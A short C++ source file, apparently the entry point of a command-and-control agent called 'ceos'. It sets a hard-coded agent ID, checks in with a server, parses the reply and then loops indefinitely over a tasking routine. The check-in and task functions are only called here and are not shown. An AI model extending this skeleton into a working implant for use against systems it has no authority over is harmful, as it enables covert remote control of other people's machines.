// ceos.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include "ceos.h"

CONFIG_CEOS* ceosConfig = (CONFIG_CEOS*)LocalAlloc(LPTR, sizeof(CONFIG_CEOS));

int main()
{
    std::cout << "Hello World!\n";

    ceosConfig->agentID = (PCHAR)"3d39a1b4-413e-4015-8690-f311c024a867";

    getUUID();

    PParser ResponseParser = checkin();
    
    parseCheckin(ResponseParser);

    while (TRUE)
        routine();
}

PCHAR getUUID()
{
    return ceosConfig->agentID;
}

VOID setUUID(PCHAR newUUID)
{
    ceosConfig->agentID = newUUID;
    return;
}